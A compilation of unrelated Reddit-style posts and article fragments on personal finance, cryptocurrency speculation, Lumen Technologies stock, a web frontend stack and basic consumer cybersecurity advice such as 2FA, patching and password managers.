47. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.

personalfinance,Mortgage holding bank offering unsolicited refinance offer,"I am about 8 years into the mortgage on my single family home.  The bank that holds the mortgage sent me an email last week offering to refinance the loan and giving me a couple of weeks to accept the offer.  All terms of the loan would remain the same except the interest rate would be reduced from 4.1% to 3.1%.  My monthly payment will be reduced by about $70.  Since I am staying with the same company and almost everything is staying the same fees/closing costs will be only a one time payment of $1200 up front.

My first reaction was that this could be phishing, but it seemed legit and I obviously went directly to the bank website (not following a link in email) and reviewed the offer independently.

Why would a bank offer such a deal to an existing customer even without me asking for it?

Though it seems to be a very good deal for me and much better than a whole new mortgage/full refinance, even a $1200 fee seems steep when everything is the same except that the interest rate changes.  Am I wrong here?

Is an offer like this a sign that the bank could be open to negotiation on terms/rate, or is this likely a cookie cutter offer that I just need to accept or reject?

Thanks so much for any insight, I feel like I don’t understand this situation at all!",finance
datascience,Data driven Web Frontends....looking at React and beyond for CRUD,"Hello fellow community,

So...While we might love jupyter and all our fancy tools when getting results into the hands of customers Webapps seem to be the deal.

Currently I am developing a few frontends, calling them “data driven” for now. Whatever that means, but it’s trendy.

Basically they are CRUD Interfaces with a lot of sugar.

Collapsible lists with tooltips, maybe a summary row, icons, colors, basically presenting data in a way that people will like to pay for.

Currently I decided to go with a Django backend and a react frontend.

Overall I have to admit I hate frontend dev almost as much as I hate Webapps. Still I thought react was a reasonable choice for a great user experience with a modern toolset.

Right now the frontends authenticate against the backends and fetches data using GraphQL instead of traditional REST. Which sounded like a great idea at the time.

But actually I feel like this was a terrible approach. When fetching data there needs to be a ton of transformation and looping over arrays done in the frontend to bringt the pieces of fetched data together in a format suitable to render tables.
Which in my opinion is a mess; fiddling with arrays in JS while there is a Python backend at my fingertips that could use pandas to do it in the fraction of the time. But that seems just how this works.

I also got fed up with react. It provides a lot of great advantages, but honestly I am not happy having tons of packages for simple stuff that might get compromised with incompatible versions and stuff down the road. Also I feel bad about the packages available to create those tables in general.
It just feels extremely inefficient, and that’s coming from someone usually writhing Python ;)

Overall what I like:
- beautiful frontend
- great structure
- single page applications just feel so good
- easy to use (mainly)

What I just can’t stand anymore:
- way too much logic inside the frontend
- way too much data transformation inside the frontend (well, all of it)
- too much packages that don’t feel reliable in the long run
- sometimes clunky to debug depending on what packages are used
- I somehow never get the exact visual results rendered that I want
- I somehow create a memory leak daily that I have to fix then (call me incompetent but I can’t figure out why this always happens to me)


So I have been talking to a few other DS and Devs and...GraphQL and React seem to be really popular and others don’t seem to mind it too much.

What are your experiences? Similar problems? Do you use something else?
I would love to ditch react in favor of something more suitable.

Overall I feel like providing a crud interface with “advanced” stuff like icons in cells, tool tips, and collapsible rows (tree structure tables) should be a common challenge, I just can’t find the proper tool for the job.

ethereum,Is the Ethereum protocol exhibiting predatory behavior? A Wednesday morning hype thread.,"It’s 1996. Google is two years from founding. Amazon is reselling books. Video streaming is possible, if you own a 56k modem, live in a major city, are rich, and possess the technical know how to complete the several steps. President Clinton is “[B]uilding that bridge to the year two-*tha*sand.”

Good old ‘96, Tupac has been shot dead and the three largest companies listed on any US stock exchange (by market cap) are car manufacturers: GM, Ford, and Chrysler, respectively. Yeah, that’s hard to believe. 

We’ve talked about *fat protocol thesis* on this sub previously. So for those that know what it is, bear with me again while I briefly explain it for those that don’t: 

*The internet is a protocol. Value flows from its protocol to its applications. Google, Amazon, etcetera are its applications. Over time, they’ve become valuable. In cryptocurrency protocols however, value flows in the opposite direction, from the application layer to the protocol. Thus the name: fat protocol theory. Yes it’s just a theory, but so is gravity. It’s easy then, to imagine why Ethereum is uniquely positioned amongst its competition to capture so much value, because of all that’s built on it, its ecosystem. 

What’s interesting about the internet and its applications capturing value, is that we didn’t see that really begin until the late 90s. In the early-mid 90s, things were only arranging or jockeying themselves to an unknown future, so obvious to us now. And remember the ferocious competition? Anyone? That’s a book itself. Most of the companies went bankrupt, some merged, others were bought out. The ones that survived are global household names. 

It’s difficult to avoid then, comparing Ethereum and cryptocurrencies to this time period, because it’s mirroring it in lockstep. Ah the 90s. Remember its tech rockstars? Of course you do, they’re still around imposing their will in various ways. In crypto we have one living rockstar (unless Satoshi is alive): Vitalik Buterin. And that’s...not insignificant either folks, not in the culture we live in, not for Ethereum’s early days. For the younger people out there, what’s happening in crypto now is basically your chance to live, in some telling, the 90s tech boom, from which half of the top 10 wealthiest US people come:

 - Bezos
 - Gates
 - Page
 - Ellison
 - Brin

So don’t squander it watching on the sidelines. It’s still so new. Yolo in.

Let’s consider the last crypto bull cycle. Question: What crypto’s that were top ten in 2017, are top ten now? Only two: BTC and ETH (LTC is in and out of the top ten on any given week, having fallen 6 places from what was historically an unshakeable #3 position). But here’s the curious thing: if we expand that list to say the top 50, how many are ERC tokens? 33 are. The Ethereum network is starting to arrange and position itself. They [ERC tokens] now dominate the mid-tier of that list and are moving relentlessly upwards. USDC and ChainLink for example (both ERC), could break into the top ten soon. That would put three ERC tokens (ETH, LINK, USDC) in the top ten, and that is much more substantial than people think. How about visualizing the data in a different way: if we use the total crypto mkt cap which is approximately $2T, we see the entire Ethereum ecosystem makes up $500B or 25% of it. That’s more than a double percentage gain (almost triple actually) what it was in 2017. Bitcoin and Tether have a top ten relationship too. But USDC now has a mkt cap ~28% of Tether’s and gaining fast. Why is this happening? That was unthinkable just two years ago. And about BTC, the wrapped version (WBTC, an ERC token) is top 20 and moving up. That’s predatory, because the Ethereum Network is finding solutions to chew on things not natively built on it. Now, Ethereum will never eat Bitcoin anymore than Bing will eat Google (but Bing only exists because of antitrust laws), so a better analogy might be what email did to the USPS—didn’t kill it, but syphoned its small cost efficient property. I won’t even bother getting into the NFT market because it’s too nascent, but again, Ethereum is positioned to add this predatory wrinkle better than any other. Our century is young, and in these early days of crypto, unless you’re named BTC, innovation lag will kill you. 

What’s my point? My point is that like the internet and its value flow, the Ethereum protocol isn’t past 1996 yet. I don’t believe we’re seeing *fat protocol thesis* at work...not yet. And that’s a subject to ponder, because heretofore, there’s been a belief that it is. It’s important to add, that many scholars believe the thesis to be wrong and unprovable, including my economics professor. They’re right too, but only because the timeline data is too small, the thesis hasn’t had time to develop (as opposed to grow), because Amazon is still reselling books, AWS (Amazon Web Services Cloud) hasn’t democratized starting a small online business, Google doesn’t exist, ruthless competition is still killing things before they begin because the young galaxy is still full of space rocks, and global users are a small landlocked lake, not oceans yet...there’s less than 1M *active* Ethereum wallets.

My other point is that one has to wonder with trends so linear, wether holding anything besides Bitcoin, ERC, or privacy coin is worth it. I’m unconvinced, which is why I don’t. I’d also be concerned about how many potential major ETF’s are now considering structuring themselves: instead of an *Ethereum ETF* made of ETH, they’ll be made of a rotational basket of the Ethereum Network’s top tokens. Too, when some ETF’s start offering baskets of all crypto’s, how many ERC tokens do you imagine will be in there if current trends hold?


Remember the top three US companies we talked about in 1996? Well, by the early 2000’s, tech companies (what we defined earlier as internet applications) began dominating the mid-tier list of largest US companies, some making it quite high. And integrated oil-majors (Exxon, Chevron, etc) replaced the car companies as the largest by mkt cap, you know the ones selling the *gas*? No point here actually, besides the pun. 

Note: I promise I’ll try bringing this all around to make sense. So let’s continue this senseless ramble: 

After the 2008 economic crisis (which lasted some years) an unexpected group of companies staged a sudden move up the mkt cap rankings: Banks. Why? Quantitative Easing, zero percent interest rates, and loose central bank monetary policy on a global scale. It’s no coincidence that at this same time, Bitcoin came into existence. But, those damn longterm *internet applications* accruing value...

Right, so fast-forward to today. Go to your brokerage and find the top companies by market cap on any stock exchange. What are they? Bingo:

 - Apple
 - Microsoft
 - Amazon
 - Alphabet 
 - Google
 - Facebook

They’ve all finally made it. The difference is, they’re unlikely to be replaced by anything unrelated. They shouldn’t be. Not for a generation, right? Wrong. Most will be replaced from the top spots because they’ll be weakened by a DAO Web 3.0 predator that syphons, feeds, borrows, steals, learns, wraps, experiments, fails, merges, digitizes, and innovates at a pace that’s impossible to keep up with. And for good measure, add in the fact that it began as, and is unified with finance. **Its imagination will never overreach its supply of money.** On a global scale, that’s insane. At least that’s the longterm view of Ethereum. What replaces the top company’s spots is anyone’s guess. If it’s Boston Dynamics I’ll know the end is near. If it’s a green energy breakthrough I’ll have hope. 


Thanks for reading. Just wanted to try cleaning my mind this morning. Now for some fun predictions a couple years out dealing with finance bits:

 - Ethereum’s gas fees fall and staking becomes available to the masses (both promises of 2.0)

 - Hindsight data shows DeFi eroding chartered bank margins

 - Central banks are forced to combat China’s digital Yuan threat by rolling out their own digital fiat much faster than we thought

 -Bitcoin captures 50% of gold’s $10T mkt cap 

 - Fat protocol thesis is finally set loose

 - ERC tokens comprise 13 of the top 20 token spots. 

 - DeFi friction collapses and with it the learning curve

 - Country’s banks compete for global retail borrowing undercutting Ethereum’s staking rewards APY by 3% or more in some places

 - Cryptocurrency makes the platform of both major US political parties 

 - Digital fiat captures the stablecoin business and Tether collapses from their front end integration allowing the Ethereum Network (all ERC tokens combined) to make a run on Bitcoin’s mkt cap

 - Volatility continues to dissipate and wild speculation is gone, the global confidence curve of crypto is flat, longterm deflationary appreciation begins and “margin capture” of what were once traditional bank margins (profits) is the new speculation as YOU become the bank

 - Two major US banks consolidate/merge 

 - Ethereum’s next major upgrade hype is an on-chain oracle 

 - US Treasury sets up probate crypto address 

 - London is no longer the world’s forex Capitol, their failure to adapt to crypto and their innovation lag is devastating

 - ENS (Ethereum Name Service) finally gets its act together allowing WEB 3.0 to begin in earnest

“Ratings agencies have become comfortable with higher and higher leverage, thus companies are more and more happy to take advantage of it,” Noel Hebert, director of credit research at Bloomberg Intelligence, said in a recent article. “There’s an incentive to hold leverage at elevated levels because there’s no real mechanism that’s punishing you.”

It’s easy to look at these valuations paired with more leveraged balance sheets and say risk is being mispriced. Some companies will default, perhaps unexpectedly, even if credit seems priced to perfection now. And yet these yields and low perceived risk of default make perfect sense. In fact, there’s a case for some of these bond yields to go lower.

First, cheap borrowing costs help companies stay alive longer and more easily. That’s a big part of the reason Fitch Ratings just dropped its expected U.S. junk-bond default rate for 2021 to 2%, the lowest since 2017, and doesn’t see it rising much more from that in 2022. About $90 billion of distressed debt was trading as of April 16, down from almost $1 trillion in March 2020, according to data compiled by Bloomberg.

Second, government officials have flooded the global economy with cash at an unprecedented pace. Monetary and fiscal stimulus for just the U.S. could have amounted to $12.3 trillion from February 2020 through March 2021, according to Cornerstone Macro Research data posted on the Wall Street Journal’s Daily Shot.

That’s a lot of money, leaving a lot of cash sitting in savings accounts and looking for assets to buy. Perhaps some investors feel it’s better to invest it with a company that actually makes something or provides real services than, say, a cryptocurrency started as a joke. 

The more important question perhaps isn’t whether this is a bubble that will pop soon but rather what are the consequences of this era of free-flowing cash. It prevents the dissolution of businesses that perhaps shouldn't exist, creating so-called zombie companies. And it leaves corporations leveraged to old economies, paying back debt incurred in a past era when they perhaps would rather invest in new technologies amid a quickly changing world.

This debt buildup makes central bankers’ jobs both more difficult and easier in the years to come. It makes it harder because any withdrawal of stimulus, or raising of rates, would be exponentially more painful given the amount of corporate leverage. But it also makes it less likely that conditions will require Federal Reserve officials to raise rates all that much going forward. More debt will pressure longer-term growth and inflation. It reduces economic dynamism. 

All this isn’t to say that the lowest-rated bonds can’t lose value in the near term. They can, and according to some investors, are likely to do so. As Oleg Melentyev of Bank of America Global Research wrote in an April 16 note, investors may start to push back after buying a record amount of triple-C rated debt in February.

Funding for these companies “is still wide open, however we think more investors are now struggling at putting their dollars at risk into cap structures levered 14x on a go-forward basis while being paid 650bps to do so, an all-time low,” he wrote. “At some point the reach for yield reaches its limit, and we think it’s here.”

Bitcoin,Why Bitcoin will not be made illegal like gold in the 1930s,"The first, and most important, thing to consider with this is why gold was made illegal. You may think it was because the government wanted to ban an alternative to their new federal reserve notes, however, this isn't the case.

&amp;#x200B;

During the roaring 20s, America was importing and exporting a large number of goods. The creation of the federal reserve note in 1913, meant that the government could pay its suppliers or any country it does business with these new notes. This made it easier to do business because there was no work in shipping the physical gold for payment. As such, the gold stayed in America but the notes were still redeemable for gold upon request of the holder. As countries continued to increase business with America they began to see themselves holding an increasing number of these new notes. Once the great depression started to take effect, countries wanted security and as a result, they wanted to cash in their notes and request their equivalent in gold. The problem for America is that they printed more federal reserve notes than the amount of gold they held in their reserves. They had multiple days of bank shutdowns, to stop a run on the banks, and in 1933 they made the possession of gold illegal... Why did they do this?

They simply didn't have enough gold to settle swaps for their notes, however, these new laws also made the export of gold illegal. By doing this they also wouldn't have to meet their obligation of providing gold to those requesting it. Below you can see a spike in US gold reserves as a result of these new confiscation laws.

The reason they were able to do this so easily and effectively is that most gold was stored in the banks. All banks had to do was give depositors notes equivalent to the gold they had in the bank. 

Since Bitcoin is almost, if not, impossible to seize and recover, it stands to reason that America is most likely not going to try to outlaw the possession of Bitcoin on the basis it can be used as a competing currency.

CryptoCurrency,"Reportedly ""Huge"" Debate Between Republicans and Democrats at SEC over a Bitcoin ETF","Buried in [an article on yahoo finance](https://finance.yahoo.com/news/biden-administration-crypto-regulatory-framework-092500388.html) yesterday about crypto regulatory framework was this little gem:

&gt;As for news on a bitcoin ETF, there is a “huge debate” going on at the commission level between Democrats and Republicans.

Crypto ETFs are obviously beneficial for the space and other countries have already approved them.  If you're wondering why beneficial, two reasons:  (1) retirement accounts and (2) boomers.  If someone has difficulty installing a printer or keeps their password ""password123"" on a post-it on their monitor, honestly, an ETF is probably a better idea than a private wallet holding their life savings.

That said, I was unhappy to hear there was a party-line fight on this issue going on at the SEC.  Arguments *against* crypto ETFs, it would seem, fall into two categories:

1. **Nanny State Argument**:  We don't want to let people invest in this because it's risky and we need to protect people from decisions we consider bad.
2. **Evil Fed Argument**:  We don't want to let people invest in this because it will speed up debasement of our fiat currency and we want that to happen slowly.

Both of these arguments are obnoxious and if (as reported) people at the SEC are arguing against crypto ETFs, they should be making these arguments publicly.  If they want to say ""I want to decide how you spend your money because I don't trust you with it.""  Fine.  Say it, so we can say, piss off.  If they want to say, ""I want to decide how you spend your money because we do not want you to have an escape valve from the slow collapse of fiat,"" fine, say that too, so we can again say piss off.

I understand the gossip is that they will likely approve crypto ETFs in the future, but I still want to know who on the commission stood in the way so I can direct my middle finger at them. (And more practically, if one of these people is nominated to some other position of trust in our financial system, I want this effort of theirs to haunt them.)  

tl;dr - Some members of the SEC are passionately arguing against crypto ETFs.  Screw them.",cryptocurrency

personalfinance,How to spend my money on student loans vs Roth Ira and other investments,"Hello. I'm 24 years old and have around $25k available. I'm just wondering the best way on how to spend my money and how I should allocate it towards loans, investing, and roth IRA. I've already looked at [https://www.reddit.com/r/personalfinance/wiki/commontopics](https://www.reddit.com/r/personalfinance/wiki/commontopics) and I know that it's smart to pay off your debt/loans first, but I'm not sure if all my money should go towards that. 

Specifically, I have about $50k left to pay in student loans. It is all federal loans (I've already paid off my private loans as the interest rate was crazy high on those). On those federal loans, my first payment is not due until 11/1/2021 and currently 0% interest, but once interest comes back it will likely be between 3-5%. I do not yet have a Roth IRA, so I would like to start one of those as well. FYI I am already maxing out my employer 401(k) contribution and have about 8% of my income going towards a Roth 401(k).

How would you recommend spending my money? I'd like to pay off my loans as fast as possible, but would also like to put money into a Roth IRA. I know I can still put money into a Roth IRA for the 2020 Tax Year until 5/17/2021, so I would like to capitalize on that if possible. I'm just trying to determine what portion of my money would be smart to put in my loans, Roth IRA, and other long term investments. Would it be smart to put a good amount of my money into an investment account and make some profits, then take that money out once I have to start paying off my loans? **Just trying to determine a good way to split my spending and what % of my money should be put where right now.** I feel like it's best to make the decision now rather than waiting. 

***I know this is my own decision, but I would just like anyone's thoughts on this. Thanks for the advice in advance.***",finance
stocks,Why P/E ratios are not as high as they actually seem,"If you take a look at average P/E ratios of stocks you will recognize, that most of them seem pretty high right now. When I started investing years ago, I learned some rule of thumb that a P/E over 15 is where a stock starts to get expensive - I know it depends on the type of stock, as growth stocks always have higher P/Es. But I want to point out where the 15 came from: 

&amp;#x200B;

In times with normal interest rates (e.g. year 2000) you got 5-6 % interests on your bank account – risk free. So if you would have put 10.000$ on your account, after 15 years (by compound interest) you would have gained about 10.000$. So in the world of stocks your bank account would have had a P/E of **15** (!). So there was some good reason needed to invest in a company that gains less earnings than your bank account could do. 

  

At the moment my bank account has a P/E of 278, but we still asses P/Es the same way. In years with QE and a something like 0.25% interests this doesn’t makes too much sense for me anymore. Therefore all that comparison of the P/E of the 2000 bubble doesn’t sound very plausible while taking interest rates into account.  

&amp;#x200B;

So maybe we should keep in mind that cheap or expensive has also something to do with the alternatives you have (and actually there are almost zero).",finance
personalfinance,Borrowing Against my Retirement 401(K) to Pay Off Credit Card Debt,"Hey PF, I’ve been lurking for some time around this sub, and I cannot seem to find the right situation that I’m going through – which makes me feel like this might be my most favorable option. If I’m wrong about this, you may bring shame to me and my family, but please point out what I’m missing first.

About me

I’m 30 years old.

$73,000 in my retirement 401(K).

Gross income is around $43,000.

My employer matches 10% of my contributions.

I contribute 5% pre-tax, and 13% after tax.

Job security is real solid, I perform well, and only foresee myself climbing the corporate ladder in the next year.

Pretty decent, I hope? I’ve worked hard to build this nest egg, but I messed up in my mid-20’s and racked up some credit card debt. I know I’ll still get the whole “You need to figure out your spending habits, yadda yadda. I get it, I’ve read it, and sacrificed a lamb to the Gods asking for forgiveness. They’ve yet to answer, but I learned my lesson and will stop buying sacrificial lambs.

DEBT

I’m in the hole $10,000, and have it split up on two different cards:

Card 1: $2,850 (8.99% APR)

Card 2: $7,150(0% APR expires in March 2022, then up to something like 25%)

I have other debts too, Car Loan is $7k, and student loans is $3k. Those debts are easily manageable and planned for.  I make more than the minimum required payments on all debts, but I need some rocket fuel to jump out of this credit card hole.  Then, I can really knock out the other two, and contribute even more to my retirement as penance for my early sins.

I don’t really want to reduce my 401K contributions, because I could only reduce it by 8% before losing the employer match, which would only net me \~$260 extra per month. I guess I’m open to the idea, but I don’t like it as much. If I did, I’m not sure if I should still mix my contributions between pre and after tax?

PLAN

401(K) loan fee is $50.

Interest Rate 4.25%

I have no idea how to calculate the potential missed growth on a $10K loan.  It seems like its been going crazy well the last couple years, and that may be where this all falls apart.  But then, there's also the missed growth opportunity on my 8% contributions each month as well. So, is it a wash?

I would have 5 years to pay it off, but plan on doing it in 1 year. Then I can increase my contributions another 3-4% or so to help make up for 1 years lost time on $10K.

I feel like I’m missing a lot with taxes too.  I don’t understand it much, especially since I’m paying both pre and after tax contributions to my retirement. 

The reason I want to do this, is that I want to buy a house next year. I don’t have an emergency fund or  a down payment saved because I’m spending all (most\*) of my free cash on debt. I believe this would help fast track it, and I have 30 more years to make up for this mistake.

Thoughts?


*Edit: THANK YOU ALL for the discussion! I decided to not take a loan from the 401k.  My first paycheck at reduced contributions will net me $340 extra each month. Card 1 will be paid off in 3 months. That leaves 7 months to knock down card 2 before the interest kicks in. After a balance transfer, I should have it paid in 12-13 months at my current income.",finance

Expedia Group, Inc. (EXPE), with a market capitalization of $24.54 billion,  revolutionized the hotel, travel and airline industry. Booking Holdings Inc. (BKNG) with a market capitalization of $99.67 billion did too (with its brands Booking.com, Priceline.com and Kayak.com). EXPE and BKNG increased marketplace efficiency, which benefited companies and consumers. Likewise, TuitionBrokers.com intends to improve marketplace efficiency in education. 

Covid-19 has crushed colleges financially. Faced with years of decreased enrollment colleges are now entering a “bidding war kind of scenario”.  This has left many of them scrambling to continue operations. According to a May 2020 survey, 345 colleges are at high risk of being unable to survive the next six years.

stocks,Lumen Technologies: An Old School Value Investor's Favorite - Notes $LUMN,"*Note to reader: This is a copy from my* [*blog*](https://brianlangis.wordpress.com/2021/04/21/lumen-technologies-an-old-school-value-investors-favorite/) *that I wanted to share. The notes are from my* *Seeking Alpha* *article on Lumen Technologies. I can't link the original article because S*eeking Alpha articles are part of our blacklist. It's not hard to find.

It's been a few months since my last write up on Seeking Alpha. Since October 2020 I think. You can read the full thing on Seeking Alpha. They hold the rights. Below are just quick notes and I suggest to read the full thing to get the proper picture of the company and opportunity.

Disclosure: I'm long Lumen Technologies ($LUMN).

* I found out about Lumen Technologies through a Globe and Mail article discussing Francis Chou's Stonetrust investments. [Stonetrust Commercial](https://www.stonetrustinsurance.com/) is an insurance company in the U.S. and like most insurance companies they make money through disciplined underwriting and properly investing the float. It turned out that Lumen is a large holding. Who still has a landline? Why would Francis want to own a dying copper landline business? I had to look to deeper into this.
* It turns out that the stock is a favorite of some [other old school value investors](https://dataroma.com/m/stock.php?sym=LUMN) such as Dr. Michael Burry from Scion Asset Management, Prem Watsa from Fairfax Financials, and Mason Hawkins from Southeastern Asset Management. Something must attract them.
* Lumen Technologies has 1.1 billion shares that trades at $12.70 a share with a market cap of $13.9b. Lumen distributes a fat 7.9% dividend yield or $1 annually which indicates that the market is not too hot on the company. Lumen distributes a fat 7.9% dividend yield. It looks safe. It's covered by free cash flow of $2.8b-$3.0. That's enough to cover the $1.1b in annual dividend distribution. Management has reiterated their commitment. Of course that's never guarantee, but more a signal of confidence to the market.
* The market is currently valuing Lumen at 5x adjusted EV/EBITDA, 8.2x 2021E earnings, and 4.7x price to free cash flow per share of $2.74, my preferred metric. This implies a 21% FCF yield. When it comes to a company like Lumen, that has a lot of debt and D&amp;A, measuring the right amount of cash left should take precedence over earnings.
* The depressed valuation, a market revaluation of their core assets, an improved profitability profile and balance sheet, and potential growth is what probably attracted these value investors.
* Lumen Technologies, formerly CenturyLink, provides communications and network services as well as security, cloud solutions, voice and managed services. CenturyLink and Quantum Fiber for residential and small businesses. Lumen for enterprises.
* The firm owns 450,000 miles of fiber. It's one of the largest fiber optics network in the world. Most of it comes from their acquisition of Level 3 in 2017. It's a Tier-1 network. That's the network with the most connections. You need to pay for access. This is their competitive advantage. Lumen sells (wholesale) high bandwidth fiber optic long haul links to other carriers.
* Remember the old Internet as a “superhighway” analogy, well Lumen is one of the major highways. Lumen is among the largest network providers in the world. If their network fails, it takes jump a huge part of the Internet with them.
* Their massive fiber network and infrastructure acts as a moat. It’s too expensive to build and to develop it against the experts in the field. Fiber businesses are attractive because once it’s built, the “maintenance” or “sustaining” capex is relatively limited, and that drives FCF.
* The value of Lumen's fiber infrastructure network is not recognized by the market given the FCF yield of 21.5%. Lumen is looking to monetize their recently completed 3-year investment program and the 7.9% dividend yield looks safe. The downside is protected by the value of its fiber network (the cost to build a similar network is probably hundreds of billions) and recent large transactions for fiber peers were at double-digit EBITDA multiples.
* Lumen is the new name for CenturyLink since September 2020. The rebranding comes with a new business strategy that goes beyond just offering connection services. They recently launched the Lumen Platform to run cloud and edge computing applications. Lumen is betting that the platform will fuel growth.
* The Lumen Platform is a move beyond providing basic connectivity. It has the capabilities that go beyond providing just internet service. With the Lumen Platform, it will level its fiber infrastructure to provide software or other needs “as a service.” Practically, what we are seeing is the evolution from telecom company (CenturyLink) to tech company (Lumen).
* A lumen is a measure of the brightness of light and the name pays homage to their fast global fiber network foundation.
* It's a myth that 5G will not kill fiber. Instead it will enhance it's importance. 5G requires a lot more cell towers, a lot more bandwidth, and will need to be connected to a wired network. The explosion in data use, particularly mobile, could make fiber assets much more lucrative. 5G needs a fiber network that can power it through multiple contact points, and help it reconnect through physical barriers.
* Edge computing. Of all the new products Lumen is launching, the Lumen Edge Compute will be one of the main drivers of future growth. I think there’s a part of the cloud story that’s overlooked and that is edge computing. With the 5G rollout, edge computing is two words we will be hearing a lot more in the coming years. Edge computing places processing power closer to where data is being created in the physical world. Edge computing is a complement to the cloud by solving issues of latency, bandwidth, autonomy, or compliance.
* One great driver for edge computing is reduced latency (much faster computing speed means reduced waiting time). The more processing can do at the edge level, the less you have to rely on the cloud, and the faster the computing
* Lumen has a lot of debt and makes up most of the enterprise value of $45b. With debt there's what you owe and what you need to pay. They have been aggressive to pay down the debt over the years. Q4-2020 long-term debt stands at $31.8b. In 2020 alone Lumen managed to reduce net debt by approximately $1.6 billion and reduced leverage to 3.6x net-debt-to-adjusted.
* If I applied a price to sale multiple of 0.8x to 1x on depressed sales ($19b vs $20b actual), you are looking at a 9% to 36.4% gain. If Lumen manages to grow their sales, it will warrant a higher multiple.
* If we assume a 15% FCF yield (6.6x FCF), Lumen would return 34%. If Lumen manages to grow, it warrants a minimum multiple of 10x FCF, and this would imply a return of 115%.
* It won’t happen overnight. I don’t expect a significant short-term boom in revenues from their investments. This is a long term play. Instead I picture a slow rising trickle of revenue growth as the country upgrades the wireless network to support 5G standards.
* Three-pronged approach to higher stock price:

1. Market revaluation of fiber network and assets to more reasonable level. The cost and importance of building it should be the floor.
2. An improvement of the business. Growth + more profit + more FCF + less debt = higher stock price. Right now the market is not confident in Lumen. The mood is bad. Better results will change the mood.
3. Financial engineering. Selling off assets at higher than market prices to pay down the debt. Refinancing expensive debt at cheaper interest rate. Synergies from Level 3 acquisition. NOL that's in the bank etc...

* Ultimately, results will drive the stock price. Even with a conservative approach, I think there’s material upside if Lumen converts on the opportunities it sees and little downside if it misses. The negative is already priced in. Meanwhile you have an opportunity to buy a company with irreplaceable assets that's considered cheap on many different metrics.

cardano,"Some advice on keeping your crypto, devices and yourself safe from hackers.","Hey guys.   I've been in IT for over 30 years and Cybersecurity roles for the past 15.  Some things I've seen on here have concerned me recently.  So I figured I'd pass on some basic advice to help you keep your crypto, your devices and yourself safe.

Enjoy... I hope... and may you be safe in your online travels.

**First is rule 1 of Cryptocurrency:**Never talk about how much you have.  It's a bad idea.  Why? Because it makes you a target.  The wonderful thing about crypto is it's decentralized and you have full control of your money.  The terrible thing about crypto is it's decentralized and you have full control of your money.  If a hacker penetrates your security and gets your crypto you're screwed, no recourse, your money is gone.  So why make yourself a target by advertising?

So don't post pics of your wallet, don't brag about having XYZ amount of any crypto, and make sure you have your secret phrase secure.  Those are the uttermost basics.  Everyone says it's best to write them down on paper, laminate it or put them on something even more indestructible and keep them in a safe place (like a bank safety deposit box).  But, if you're going to go ahead and store them digitally make SURE you store them encrypted.  Encrypt the file, zip it, encrypt the zip and then, preferably, put it on a USB stick and save it somewhere.  If for some reason you decide to store it in a cloud location make sure that whatever cloud you use stores files encrypted and uses 2FA.  Preferably make sure it's blind encryption where only you have the keys.

Speaking of Wallets it's a good idea to move any crypto you aren't actively trading to a wallet rather than leaving it on an exchange.  It's just good practice to expose as little as you can to any potential risks and many currencies have better staking rewards and other benefits if you have it in a wallet rather than on an exchange.  Some don't stake at all on exchanges, others do... depends on the exchange.  I'll leave it to others to debate the pros/cons of the various wallets you can use. Most will tell you to use a hardware wallet.

&amp;#x200B;

Some further security advice if you want it... warning... it's long:

**Keep your devices up to date**Always keep your devices on their latest security patches!  I don't care if you're scared that windows update MIGHT break something or your apps might have issues if you update your iOS version (My wife's favorite complaint).  I'd rather have to revert to a last known good than allow a scrub hacker using a downloaded exploit kit get into my system with ease.  It's just not worth the risk to keep your system unpatched because 1 in 10,000 people experience an issue with update # XYZ from Microsoft/Apple/Whomever.

1. No, Apple computers are not hack/virus/malware proof.  They are just as susceptible to vulnerabilities as any other platform.  A LOT of apple users buy into the myth that the OS is more secure than MS.  TECHNICALLY it does have fewer total known vulnerabilities but... it only takes one and more are found all the time.  No OS is safe, not even Linux.  So make sure you're keeping your systems patched and up to date.
2. Keep all of your apps, not just your antivirus, up to date as well.  It can be a pain keeping everything up to date on a PC because there's not a lot of automatic updating going on for 3rd party apps and most of the time it's a manual process.  There's apps like PatchMyPC that help with this (do research before using one) and can make your life a whole lot easier.
3. Speaking of Antivirus don't just use antivirus.  Get a good anti-malware solution as well.  As to antivirus, ironically Windows 10's built in defender is actually a pretty decent antivirus solution these days so you can just stick with that and a good malware program if you don't want to pay for MacAfee or Norton or Kaspersky etc.  But make sure you have a good antivirus and a good anti-malware solution and that you use them.

**Use Two Factor authentication**Even online games have 2FA these days.  So use 2FA on any websites you log into that has any kind of sensitive information on it, especially anything financial or email accounts.  Wherever possible use an authenticator app rather than email or SMS for your 2FA.  SMS is good if nothing else is available but phones can be sim spoofed and email can be hacked.  So get a good 2FA app (like Google Authenticator) and use it.  Even Reddit supports 2FA now.  Absolutely use 2FA for any site you buy/sell crypto on!

**Check your email addresses to make sure they haven't been breached periodically**.A great way to do this is to check [**https://haveibeenpwned.com/**](https://haveibeenpwned.com/) and put your email address in to see if it's been reported in any breach reports.  It's a very reputable site and is well maintained.  No, you aren't putting anything at risk by putting your email address there.  People can already get that easily enough.  You're checking to see if your PASSWORD has been hacked.

**Password Security**Don't re-use passwords if at all possible.  Use a different password for every site and make sure they're complex especially for email accounts.  Never re-use an email account password because that's how sites reset your 2FA or password (or both) and if your email gets hacked all bets could be off.

If you have trouble making complex passwords use autogenerated ones from Chrome or KeePass, Bitwarden or any number of other good password utilities.  Some VPN suppliers provide one and a lot of ISPs do now as well.  You can also use these utilities to store them securely so you won't forget them.  A bonus to using them is most password utilities also have an option to check breach reports to see if your accounts stored in them have been compromised somewhere so you can proactively go change your passwords there.

***IMPORTANT NOTE:***  If you find that an account HAS been breached, immediately change that password and, if you've used that password ANYWHERE else go change it there too.

**Use a paid VPN to keep your network traffic private!**  ^(()I do not recommend using the free VPN applications offered by various browsers, ISPs, etc.  They are junk and they log and they are not truly secure.  There are a couple free VPN's (sort of free trials) out there that are secure but they have limited bandwidth or limited servers to choose from and they generally don't support split tunneling or many other important features.  Pay the 5 or 6 bucks a month for a good one, it's worth it.  No, it's not going to noticeably slow down your internet unless you're downloading a lot of really big files (more on that in a minute).  Most GOOD VPN solutions even let you stream videos just fine without any issue.  I do it all the time on mine.

